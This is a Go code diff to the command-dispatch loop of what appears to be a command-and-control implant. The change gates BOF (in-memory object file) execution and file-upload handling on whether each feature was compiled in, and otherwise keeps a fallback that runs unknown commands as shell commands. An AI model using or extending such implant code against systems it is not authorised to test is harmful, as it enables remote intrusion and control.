@@ -132,20 +132,32 @@ func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
 		}
 	}
 
-	// Handle async BOF commands WITH data
+	// Handle async BOF commands WITH data (only if bof feature is registered)
 	if cmd.CT == CmdBofAsync && cmd.Data != "" {
-		result := cq.processBOFAsync(cmd)
-		return &result, nil
+		if _, exists := cq.cmdHandlers[CmdBofAsync]; exists {
+			result := cq.processBOFAsync(cmd)
+			return &result, nil
+		}
 	}
 
-	// Handle regular BOF commands WITH data
+	// Handle regular BOF commands WITH data (only if bof feature is registered)
 	if cmd.CT == CmdBof && cmd.Data != "" {
-		result := cq.processBOF(cmd)
-		return &result, nil
+		if _, exists := cq.cmdHandlers[CmdBof]; exists {
+			result := cq.processBOF(cmd)
+			return &result, nil
+		}
 	}
 
-	// Handle upload chunks
+	// Handle upload chunks (only if upload feature is registered)
 	if cmd.CT == CmdUpload && cmd.Data != "" {
+		if _, exists := cq.cmdHandlers[CmdUpload]; !exists {
+			return &OpResult{
+				Cmd:    cmd,
+				EStr:   Err(E19),
+				EC:     1,
+				Done:   time.Now().Format(time.RFC3339),
+			}, nil
+		}
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
 		if err != nil {
 			return &OpResult{
@@ -263,7 +275,19 @@ func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
 		return &result, nil
 	}
 
-	// If no handler found (CT == CmdUnknown or unregistered), try shell command
+	// Known command type but handler not compiled in (modular build)
+	if cmd.CT != CmdUnknown {
+		return &OpResult{
+			Cmd:    cmd,
+			Output: Err(E19),
+			Error:  fmt.Errorf("%s", Err(E19)),
+			EStr:   Err(E19),
+			EC:     1,
+			Done:   time.Now().Format(time.RFC3339),
+		}, nil
+	}
+
+	// CmdUnknown: try as shell command
 	output, err := executeShellCommand(cmd.Cmd)
 	if err != nil {
 		return &OpResult{
